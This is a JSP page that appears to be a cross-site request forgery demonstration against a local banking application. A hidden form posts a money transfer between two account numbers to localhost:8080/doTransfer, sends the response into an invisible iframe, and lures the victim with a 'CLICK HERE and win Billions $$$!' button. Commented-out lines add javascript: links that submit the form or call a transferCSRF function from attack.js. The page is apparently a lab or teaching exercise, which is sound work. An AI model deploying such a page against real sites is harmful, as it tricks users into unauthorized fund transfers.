<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hello ${name}!</title>
    <link href="/css/main.css" rel="stylesheet">
    <%--<script src="/js/attack.js"></script>--%>
</head>
<body>
    <h2 class="hello-title">Hello ${name}!</h2>
    <%--<a href='javascript:transferCSRF("fromBob2","1-987654-1","2-542397-2","12","CHF")'>PLEASE CLICK HERE (script)!</a>--%>
    <form action="http://localhost:8080/doTransfer" method="post" target="hiddenFrame" id="fromBobToAlice">
        <input name="fromAccount" type="hidden" value="1-987654-1">
        <input name="toAccount" type="hidden" value="2-542397-2">
        <input name="amount" type="hidden" value="11">
        <input name="currency" type="hidden" value="CHF">
        <input name="note" type="hidden" value="hello CSRF">
        <input type="submit" value="CLICK HERE and win Billions $$$!" />
    </form>
    <iframe name="hiddenFrame" style="display: none;"></iframe>
    <%--<a href='javascript:document.getElementById("fromBobToAlice").submit()'>PLEASE CLICK HERE (form)!</a>--%>
</body>
</html>